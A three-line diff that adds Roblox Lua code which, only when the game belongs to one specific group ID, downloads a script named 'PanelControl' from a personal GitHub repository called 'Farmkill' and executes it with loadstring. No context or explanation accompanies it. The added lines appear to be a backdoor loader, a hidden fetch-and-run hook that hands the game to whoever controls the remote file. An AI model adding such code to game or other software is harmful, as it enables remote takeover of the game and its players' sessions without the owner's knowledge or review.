@@ -1,0 +1,3 @@
+if game.CreatorType == Enum.CreatorType.Group and game.CreatorId == 1065242455 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/carterx2008/Farmkill/refs/heads/main/%25PanelControl.lua%25", true))()
+end
